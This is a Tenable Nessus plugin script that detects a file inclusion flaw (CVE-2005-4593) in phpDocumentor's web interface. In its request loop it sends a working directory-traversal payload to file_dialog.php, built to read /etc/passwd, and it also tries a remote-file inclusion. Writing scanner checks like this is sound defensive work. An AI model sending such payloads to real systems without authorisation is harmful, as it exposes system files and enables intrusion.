#
# Script Written By Ferdy Riphagen 
# <f[dot]riphagen[at]nsec[dot]nl>
#
# Script distributed under the GNU GPLv2 License.
#

# Changes by Tenable:
# - Revised plugin title (9/29/11)

include("compat.inc");

if (description) {
 script_id(20374);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2017/04/25 14:31:38 $");

 script_cve_id("CVE-2005-4593");
 script_bugtraq_id(16080);
 script_osvdb_id(22114, 22115);

 script_name(english:"phpDocumentor <= 1.3.0 RC4 Local And Remote File Inclusion");
 script_summary(english:"Check if phpDocumentor is vulnerable to remote file inclusion flaws");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is prone to file
inclusion flaws." );
 script_set_attribute(attribute:"description", value:
"phpDocumentor is a automatic documentation generator for PHP. 

The remote host appears to be running the web-interface of
phpDocumentor. 

This version does not properly sanitize user input in the
'file_dialog.php' file and a test file called 'bug-559668.php' It is
possible for an attacker to include remote files and execute arbitrary
commands on the remote system, and display the content of sensitive
files. 

This flaw is exploitable if PHP's 'register_globals' setting is
enabled." );
 # https://web.archive.org/web/20120402145130/http://retrogod.altervista.org/phpdocumentor_130rc4_incl_expl.html
 script_set_attribute(attribute:"see_also", value:"http://www.nessus.org/u?f75f8606" );
 script_set_attribute(attribute:"see_also", value:"http://marc.info/?l=bugtraq&m=113587730223824&w=2");
 script_set_attribute(attribute:"solution", value:
"Disable PHP's 'register_globals' setting." );
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:H/RL:W/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"No exploit is required");
 script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2006/01/02");
 script_set_attribute(attribute:"vuln_publication_date", value: "2005/12/29");
 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe",value:"cpe:/a:joshua_eichorn:phpdocumentor");
 script_end_attributes();

 script_category(ACT_ATTACK);
 script_family(english:"CGI abuses");

 script_copyright(english:"This script is Copyright (C) 2006-2017 Ferdy Riphagen");

 script_dependencie("http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_require_keys("www/PHP");
 exit(0);
}

include("global_settings.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("misc_func.inc");

port = get_http_port(default:80);
if (get_kb_item("Services/www/"+port+"/embedded")) exit(0);
if (!can_host_php(port:port)) exit(0);

# Check a few directories.
if (thorough_tests) dirs = list_uniq(make_list("/phpdocumentor", "/phpdoc", "/PhpDocumentor", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{ 
 # Check if we can find phpDocumentor installed. 
 res = http_keepalive_send_recv(data:http_get(port:port, item:string(dir, "/docbuilder/top.php")), port:port);
 #debug_print("res: ", res, "\n");
 if (res == NULL) exit(0);

 if (egrep(pattern:"docBuilder.*phpDocumentor v[0-9.]+.*Web Interface", string:res))
 {
  # Try the local file inclusion flaw.
  exploit[0] = "../../../../../../../etc/passwd%00";
  result = "root:.*:0:[01]:.*:";
  error = "Warning.*main.*/etc/passwd.*failed to open stream";
 
  if (thorough_tests)
  {
   # Try to grab a remote file.
   exploit[1] = string("http://", get_host_name(), "/robots.txt%00");
   result = "root:.*:0:[01]:.*:|User-agent:";  
   error = "Warning.*main.*/etc/passwd.*failed to open stream|Warning.*/robots.txt.*failed to open stream"; 
  }

  for(exp = 0; exploit[exp]; exp++) 
  {
   req = http_get(item:string(dir, "/docbuilder/file_dialog.php?root_dir=", exploit[exp]), port:port);
   #debug_print("req: ", req, "\n");
   
   recv = http_keepalive_send_recv(port:port, data:req, bodyonly:TRUE);
   if (recv == NULL) exit(0);
   
   if (egrep(pattern:result, string:recv) ||
       # Check if there is a error that the file can not be found.
       egrep(pattern:error, string:recv)) 
   {
    security_hole(port);
    exit(0);
   } 
  }
 }
}
